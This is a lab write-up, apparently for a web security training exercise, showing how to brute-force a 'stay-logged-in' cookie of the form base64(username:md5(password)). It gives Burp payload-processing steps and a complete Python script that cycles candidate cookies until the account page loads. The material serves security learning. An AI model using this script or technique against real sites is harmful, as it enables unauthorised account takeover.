This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- Candidate passwords

---

**Goal:** Obtain and brute-force Carlos's cookie to gain access to his "My account" page.

**Analysis:** The `stay-logged-in` cookie is stored in base64 and has a md5 password. So i can use carlos in base64 and convert the passwords to md5 to brute-force.
`base64(username:md5(password))`
`base64(carlos:md5(x))`

- Never put hashes in an online application, because that is classed as **breach of information**. Use offline tools like hashcat, but for CTF and other exercises it's fine to use online tools like crackstation. 

The `my-account` request will contain the `stay-logged-in` cookie. This is what we would send to repeater if we had burpsuite pro. 

- Remove the session cookie so it will generate a new session when i get it correct. 
- I'll use the provided password list and i need to use payload processing this time to change the passwords into base64 before trying them against the app.
- Add rule type `Hash` and choose `MD5`
- Add prefix `carlos:`
- Finally add `encode` to convert all of that into `Base64-encode`

![[Pasted image 20240825112420.png]]

`Y2FybG9zOjY3MGIxNDcyOGFkOTkwMmFlY2JhMzJlMjJmYTRmNmJk`

![[Pasted image 20240825112618.png]]

**Solution:** Burp, but i'll also write a script for practice.

```python
#!/usr/bin/python3

import hashlib
import base64
import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def access_carlos_account(url):
	print("(+) Brute-forcing carlos's password...")
	with open('passwords.txt', 'r') as file:
		for pwd in file:
			hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
			encoded_pwd = base64.b64encode(bytes(hashed_pwd, "utf-8"))
			str_pwd = encoded_pwd.decode("utf-8")
			
			# Perform request
			r = requests.Session()
			my_account = url + "/my-account"
			cookies = {'stay-logged-in': str_pwd}
			req = r.get(my_account, cookies=cookies, verify=False, proxies=proxies)
			if "Log out" in req.text:
				print("(+) Carlos's Password Is: " + pwd)
				sys.exit(-1)
		
		print("(-) Sorry, i couldn't find Carlos's Password...")

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <url>' % sys.argv[0])
		print('(+) Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	access_carlos_account(url)

if __name__ == '__main__':
	main()
```



